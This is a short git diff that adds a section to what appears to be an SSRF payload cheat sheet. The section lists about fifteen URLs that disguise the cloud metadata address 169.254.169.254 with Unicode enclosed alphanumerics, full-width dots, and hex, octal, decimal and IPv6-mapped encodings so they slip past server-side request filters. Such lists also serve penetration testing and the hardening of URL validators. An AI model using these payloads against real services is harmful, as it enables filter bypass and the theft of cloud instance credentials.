@@ -173,6 +173,40 @@ https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFn
 
 ***
 
+### Abusing Enclosed Alphanumerics
+
+`http://169。254。169。254/`
+
+`http://169｡254｡169｡254/`
+
+`http://⑯⑨。②⑤④。⑯⑨｡②⑤④/`
+
+`http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/`
+
+`http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/`
+
+`http://②⑧⑤②⓪③⑨①⑥⑥:80/`
+
+`http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/`
+
+`http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/`
+
+`http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/`
+
+`http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/`
+
+`http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/`
+
+`http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/`
+
+`http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/`
+
+`http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/`
+
+`http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/`
+
+***
+
 ### commonly-open-ports.txt - list of commonly open ports
 
 ***
